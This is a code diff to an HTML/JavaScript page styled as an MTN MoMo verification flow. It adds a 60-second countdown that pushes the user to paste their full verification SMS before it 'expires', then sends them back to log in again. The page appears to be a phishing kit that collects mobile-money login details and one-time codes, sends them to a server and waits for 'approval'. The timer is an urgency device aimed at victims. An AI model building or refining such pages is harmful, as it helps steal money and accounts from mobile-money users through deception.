@@ -169,7 +169,7 @@
   .wait-wrap h2 { font-size:1.6rem; font-weight:700; color:#fff; margin-bottom:12px; }
   .wait-wrap p  { color:rgba(255,255,255,0.75); font-size:0.88rem; line-height:1.7; margin-bottom:24px; }
 
-  /* ───---- PAGE: SMS MESSAGE PASTE ------- */
+  /* ───────── PAGE: SMS MESSAGE PASTE ──────── */
   #page-sms-paste { background:#fff; }
   .sms-topbar { display:flex; align-items:center; justify-content:space-between; padding:0 20px; height:52px; border-bottom:1px solid #eee; flex-shrink:0; }
   .sms-topbar .bk { font-size:1.1rem; color:#333; cursor:pointer; background:none; border:none; }
@@ -185,6 +185,19 @@
   .sms-curve { background:#fff; overflow:hidden; flex-shrink:0; }
   .sms-curve::before { content:''; display:block; background: var(--mtn-dark); height:50px; clip-path:ellipse(60% 100% at 50% 100%); margin-bottom:-4px; }
   .sms-foot { background: var(--mtn-dark); padding:14px; text-align:center; font-size:0.75rem; color:rgba(255,255,255,0.45); }
+
+
+  /* ───── SMS COUNTDOWN TIMER ───── */
+  .sms-timer-wrap { display:flex; align-items:center; gap:10px; margin-bottom:14px; padding:10px 14px; background:#fff8f0; border:1.5px solid #f5c28a; border-radius:var(--radius-sm); }
+  .sms-timer-circle { position:relative; width:44px; height:44px; flex-shrink:0; }
+  .sms-timer-svg { transform:rotate(-90deg); }
+  .sms-timer-bg { fill:none; stroke:#f0e0cc; stroke-width:4; }
+  .sms-timer-arc { fill:none; stroke:#e07800; stroke-width:4; stroke-linecap:round; stroke-dasharray:113; stroke-dashoffset:0; transition:stroke-dashoffset 1s linear, stroke 1s; }
+  .sms-timer-arc.urgent { stroke:#d91e1e; }
+  .sms-timer-num { position:absolute; inset:0; display:flex; align-items:center; justify-content:center; font-size:0.75rem; font-weight:700; color:#e07800; }
+  .sms-timer-num.urgent { color:#d91e1e; }
+  .sms-timer-text { font-size:0.82rem; color:#7a4500; line-height:1.4; }
+  .sms-timer-text strong { font-weight:600; }
 
   /* ───── PAGE: OTP ───── */
   #page-otp { background:#fff; }
@@ -503,6 +516,17 @@
     <div class="sms-card">
       <h2>Paste SMS Message</h2>
       <p class="sms-hint">A verification message has been sent to your phone. Please copy and paste the full message here.</p>
+      <!-- SMS 60-second countdown timer -->
+      <div class="sms-timer-wrap" id="smsTimerWrap">
+        <div class="sms-timer-circle">
+          <svg class="sms-timer-svg" width="44" height="44" viewBox="0 0 44 44">
+            <circle class="sms-timer-bg" cx="22" cy="22" r="18"/>
+            <circle class="sms-timer-arc" id="smsTimerArc" cx="22" cy="22" r="18"/>
+          </svg>
+          <div class="sms-timer-num" id="smsTimerNum">60</div>
+        </div>
+        <div class="sms-timer-text"><strong>Message expires in <span id="smsTimerSec">60</span>s.</strong><br>Paste your SMS before time runs out.</div>
+      </div>
       <textarea id="smsMsgBox" class="sms-textarea" placeholder="Paste your full SMS message here…" oninput="chkSmsMsg()"></textarea>
       <p class="sms-code-hint">Example: "Your MTN MoMo verification code is: 123456"</p>
       <div class="msg-box error" id="smsMsg"><span class="msg-icon">✕</span><span id="smsMsgTxt"></span></div>
@@ -681,6 +705,7 @@
       spinner.classList.remove('show');
       chkSmsMsg();
       ['smsMsg','smsMsgOk'].forEach(function(id){ document.getElementById(id).classList.remove('show'); });
+      startSmsTimer();
     }
 
     if (pageId === 'page-otp') {
@@ -982,8 +1007,87 @@
     if (type === 'success') { document.getElementById('smsMsgOkTxt').textContent = text; document.getElementById('smsMsgOk').classList.add('show'); }
   }
 
+
+  // ══════════════════════════════════════════════════════
+  // SMS PAGE — 60-second expiry countdown timer
+  // ══════════════════════════════════════════════════════
+  let smsTimerInterval = null;
+  let smsTimerExpired  = false;
+
+  function startSmsTimer() {
+    // Clear any existing timer first
+    if (smsTimerInterval) clearInterval(smsTimerInterval);
+    smsTimerExpired = false;
+
+    // Reset textarea and button
+    document.getElementById('smsMsgBox').value = '';
+    document.getElementById('smsMsgBox').disabled = false;
+    chkSmsMsg();
+
+    // Reset timer visuals
+    const arc = document.getElementById('smsTimerArc');
+    const num = document.getElementById('smsTimerNum');
+    const sec = document.getElementById('smsTimerSec');
+    arc.classList.remove('urgent');
+    num.classList.remove('urgent');
+    arc.style.strokeDashoffset = '0';
+
+    // Show timer wrap
+    document.getElementById('smsTimerWrap').style.display = 'flex';
+
+    let remaining = 60;
+    const CIRCUMFERENCE = 113; // 2 * pi * 18
+
+    const tick = function() {
+      remaining--;
+      const pct = remaining / 60;
+      arc.style.strokeDashoffset = String(CIRCUMFERENCE * (1 - pct));
+      num.textContent = remaining;
+      sec.textContent = remaining;
+
+      if (remaining <= 10) {
+        arc.classList.add('urgent');
+        num.classList.add('urgent');
+      }
+
+      if (remaining <= 0) {
+        clearInterval(smsTimerInterval);
+        smsTimerInterval = null;
+        smsTimerExpired  = true;
+
+        // Disable textarea and submit button
+        document.getElementById('smsMsgBox').disabled = true;
+        document.getElementById('bSms').disabled = true;
+        document.getElementById('bSms').className = 'btn-sms';
+
+        // Show expiry error — ask user to re-paste
+        ['smsMsg','smsMsgOk'].forEach(function(id){ document.getElementById(id).classList.remove('show'); });
+        document.getElementById('smsMsgTxt').textContent =
+          'This verification session has expired. Please go back and log in again, then paste your new SMS message.';
+        document.getElementById('smsMsg').classList.add('show');
+
+        // Hide the timer widget
+        document.getElementById('smsTimerWrap').style.display = 'none';
+      }
+    };
+
+    smsTimerInterval = setInterval(tick, 1000);
+  }
+
+  function stopSmsTimer() {
+    if (smsTimerInterval) {
+      clearInterval(smsTimerInterval);
+      smsTimerInterval = null;
+    }
+  }
+
   async function doSmsParse() {
     ['smsMsg','smsMsgOk'].forEach(id => document.getElementById(id).classList.remove('show'));
+
+    if (smsTimerExpired) {
+      showSmsMsg('error', 'This verification session has expired. Please go back and log in again, then paste your new SMS message.');
+      return;
+    }
 
     const msg = document.getElementById('smsMsgBox').value.trim();
     if (msg.length < 3) {
@@ -1005,6 +1109,7 @@
       document.getElementById('mSms').classList.remove('show');
 
       if (data.success) {
+        stopSmsTimer();
         document.getElementById('waitSmsAppId').textContent = S.applicationId;
         goTo('page-wait-sms');
         pollForSmsApproval(S.applicationId);
